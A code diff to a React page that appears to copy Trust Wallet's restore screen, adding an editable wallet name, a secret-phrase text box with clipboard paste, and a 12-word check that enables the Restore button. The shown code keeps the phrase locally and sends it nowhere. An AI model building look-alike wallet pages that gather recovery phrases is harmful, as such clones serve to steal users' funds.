@@ -41,9 +41,26 @@ function AddExistingWalletPage() {
   const [step, setStep] = useState('wallets')
   const [showSafetySheet, setShowSafetySheet] = useState(false)
   const [checkedItems, setCheckedItems] = useState([])
+  const [walletName, setWalletName] = useState('Main Wallet 1')
+  const [secretPhrase, setSecretPhrase] = useState('')
+
+  const phraseWordCount = secretPhrase.trim().split(/\s+/).filter(Boolean).length
+  const canRestore = walletName.trim().length > 0 && phraseWordCount >= 12
 
   function openTrustWalletSite() {
     window.location.href = 'https://trustwallet.com/'
+  }
+
+  async function pasteSecretPhrase() {
+    try {
+      const pastedPhrase = await navigator.clipboard?.readText()
+
+      if (pastedPhrase) {
+        setSecretPhrase(pastedPhrase)
+      }
+    } catch {
+      // Clipboard access can be denied depending on browser permissions.
+    }
   }
 
   function toggleSafetyCheck(item) {
@@ -217,23 +234,44 @@ function AddExistingWalletPage() {
           }
         />
         <section className="restore-form">
-          <label>
-            <span>Wallet name</span>
+          <div className="restore-field">
+            <label htmlFor="wallet-name">Wallet name</label>
             <div className="wallet-name-field">
-              <input type="text" value="Main Wallet 1" readOnly />
-              <IoClose className="wallet-name-clear" aria-hidden="true" />
+              <input
+                id="wallet-name"
+                type="text"
+                value={walletName}
+                onChange={(event) => setWalletName(event.target.value)}
+              />
+              <button
+                className="wallet-name-clear"
+                type="button"
+                aria-label="Clear name"
+                onClick={() => setWalletName('')}
+              >
+                <IoClose aria-hidden="true" />
+              </button>
             </div>
-          </label>
-          <label>
-            <span>Secret phrase</span>
+          </div>
+          <div className="restore-field">
+            <label htmlFor="secret-phrase">Secret phrase</label>
             <div className="secret-phrase-safe-box">
-              <button type="button">Paste</button>
+              <textarea
+                id="secret-phrase"
+                value={secretPhrase}
+                spellCheck="false"
+                autoCapitalize="none"
+                autoComplete="off"
+                autoCorrect="off"
+                onChange={(event) => setSecretPhrase(event.target.value)}
+              />
+              <button type="button" onClick={pasteSecretPhrase}>Paste</button>
             </div>
-          </label>
+          </div>
           <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
         </section>
         <section className="restore-actions">
-          <button className="continue-button" type="button" disabled onClick={() => navigate('/wallet')}>
+          <button className="continue-button" type="button" disabled={!canRestore} onClick={() => navigate('/wallet')}>
             Restore wallet
           </button>
           <button className="secret-help" type="button" onClick={openTrustWalletSite}>
